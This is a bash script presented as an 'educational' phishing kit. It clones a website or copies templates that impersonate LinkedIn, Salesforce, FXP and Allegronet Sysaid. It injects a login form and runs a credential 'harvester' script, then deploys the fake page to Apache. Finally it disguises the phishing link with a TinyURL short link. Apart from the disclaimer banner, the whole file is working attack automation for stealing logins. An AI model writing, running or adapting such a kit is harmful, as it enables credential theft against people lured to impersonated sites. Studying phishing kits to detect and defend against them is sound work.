#!/bin/bash
echo -e "${RED}═══════════════════════════════════════════════════════════════════════"
echo -e " WARNING: This tool is intended strictly for educational use only."
echo -e " Unauthorized use against live systems without permission is illegal"
echo -e " and unethical. You are solely responsible for how you use this tool."
echo -e "═══════════════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}"
echo "╔═══════════════════════════════════════════════════╗"
echo "║                                                   ║"
echo "║    Educational Phishing - Made By Shahar          ║"
echo "║                                                   ║"
echo "╚═══════════════════════════════════════════════════╝"
echo -e "${NC}"

#Spinner
spin() {
  local -a marks=('/' '-' '\\' '|')
  while true; do
    for mark in "${marks[@]}"; do
      echo -ne "\r[+] Initializing ${mark}"
      sleep 0.1
    done
  done
}

# Link Generator
generate_random_suffix() {
    tr -dc 'a-z0-9' </dev/urandom | head -c 6
}

# Create TinyURL
create_tinyurl() {
    local long_url=$1
    local api_token="API-KEY"

    response=$(curl -s -X POST "https://api.tinyurl.com/create" \
      -H "Authorization: Bearer $api_token" \
      -H "Content-Type: application/json" \
      -d "{\"url\": \"$long_url\", \"domain\": \"tinyurl.com\"}")

    if command -v jq >/dev/null; then
        short_url=$(echo "$response" | jq -r '.data.tiny_url')
    else
        short_url=$(echo "$response" | grep -oP '(?<="tiny_url":\")[^\"]+' | sed 's/\\\//\//g')
    fi

    if [[ -n "$short_url" ]]; then
        echo "[+] Short URL: $short_url"
    else
        echo "[!] Failed to create short URL."
        echo "$response"
    fi
}

# Initialization
spin & SPIN_PID=$!
sleep 5
kill $SPIN_PID >/dev/null 2>&1
wait $SPIN_PID 2>/dev/null

echo -e "\r[+] Initialization complete!"
sleep 1

echo "[-] Checking required modules."
sleep 0.5

check_module() {
    local cmd=$1
    local name=$2
    echo "[-] Checking: $name"
    sleep 0.5
    if ! command -v $cmd &>/dev/null; then
        sudo apt install -y -qq $name >/dev/null 2>&1
        echo "[*] $name has been installed"
    else
        echo "[+] $name is ready."
    fi
    sleep 0.5
}

check_module wget wget
check_module apache2 apache2
check_module php php
check_module certbot certbot

echo "[+] Everything is ready!"
sleep 0.5

while true; do
    echo "Choose setup:"
    echo "1. Clone a website (URL)"
    echo "2. Use built-in template"
    echo -n "> "
    read -n 1 setup_choice
    echo 

    if [[ "$setup_choice" == "1" ]]; then
        echo "You chose to Clone a website"
        echo -n "Place your domain here: "
        read domain_name

        site_name=$(echo "$domain_name" | awk -F[/:] '{print $4}' | cut -d'.' -f1)
        target_dir="/home/kali/Desktop/My_Scripts/Phishing/Templates/custom/$site_name"
        mkdir -p "$target_dir"

        echo "[*] Cloning site..."
        wget -p -k -E -r -l 1 --no-host-directories -P "$target_dir" "$domain_name" >/dev/null 2>&1

        if [[ ! -d "$target_dir" || $(find "$target_dir" -type f -name '*.html' | wc -l) -lt 1 ]]; then
            echo "[!] wget failed or no HTML files downloaded."
            exit 1
        fi

        echo "[+] Clone complete."

        cd "$target_dir" || exit

        mapfile -t login_candidates < <(find . -type f -iname '*.html' | grep -Ei '(login|index)' | sort)

        if [[ ${#login_candidates[@]} -eq 0 ]]; then
            echo "[!] No HTML files containing 'login' or 'index' found."
            exit 1
        fi

        echo "[*] Found the following potential login files:"
        for i in "${!login_candidates[@]}"; do
            echo "$((i+1)). ${login_candidates[$i]}"
        done

        echo -n "Select the number of the file to inject (1-${#login_candidates[@]}): "
        echo -n "> "
		read -n 1 choice
		echo

        if ! [[ "$choice" =~ ^[0-9]+$ ]] || (( choice < 1 || choice > ${#login_candidates[@]} )); then
            echo "[!] Invalid selection."
            exit 1
        fi

        login_file="${login_candidates[$((choice-1))]}"
        echo "[*] Preparing new index.html using: $login_file"

        rm -f index.html
        /home/kali/Desktop/My_Scripts/Phishing/Templates/inject_form.sh "$login_file" >/dev/null 2>&1

        if [[ ! -f index.html ]]; then
            echo "[!] inject_form.sh failed to produce index.html"
            exit 1
        fi

        index_path="$(realpath index.html)"

 #       echo "[*] Calling harvester with: $domain_name | $index_path"
 #       ls -l "$index_path"

        /home/kali/Desktop/My_Scripts/Phishing/Templates/better_harvester_universal.sh "$index_path" "$domain_name" >/dev/null 2>&1

        sudo rm -rf /var/www/html/*
		sudo cp -r "$target_dir"/* /var/www/html/
		sudo chown -R www-data:www-data /var/www/html
		sudo chmod -R 755 /var/www/html
        echo "[+] Custom index.html deployed to Apache."
        break

    elif [[ "$setup_choice" == "2" ]]; then
        echo "Choose a template:"
        echo "1. FXP"
        echo "2. Salesforce"
        echo "3. Allegronet Sysaid"
        echo "4. Linkedin"
        echo -n "> "
        read -n 1 template_choice
        echo

        case "$template_choice" in
            1) template_path="FXP" ;;
            2) template_path="salesforce" ;;
            3) template_path="allegronet" ;;
            4) template_path="linkedin" ;;
            *) echo "Invalid template choice"; continue ;;
        esac

        echo "[*] Copying $template_path template..."
        sudo rm -rf /var/www/html/*
        sudo cp -r "/home/kali/Desktop/My_Scripts/Phishing/Templates/$template_path/"* /var/www/html/
        sudo chown -R www-data:www-data /var/www/html
        sudo chmod -R 755 /var/www/html
        echo "[+] Template copied to /var/www/html/"
        break

    else
        echo "Invalid setup choice"
    fi
done

while true; do
    echo "Do you have a custom domain? (Y/N):"
    echo -n "> "
    read -n 1 custom_domain
    echo
    if [[ "$custom_domain" == "y" || "$custom_domain" == "Y" ]]; then
        echo "[!] Custom domain selected, but SSL setup is skipped."
        echo "[!] To enable HTTPS with Certbot in the future:"
        echo "    1. Point your domain to this machine's public IP."
        echo "    2. Open ports 80 and 443."
        echo "    3. Run: sudo certbot --apache -d yourdomain.com"
        break
    elif [[ "$custom_domain" == "n" || "$custom_domain" == "N" ]]; then
        sudo service apache2 restart
        break
    else
        echo "Invalid choice!"
    fi
done

rand=$(generate_random_suffix)
phish_url="http://192.168.47.129?r=$rand"
create_tinyurl "$phish_url"
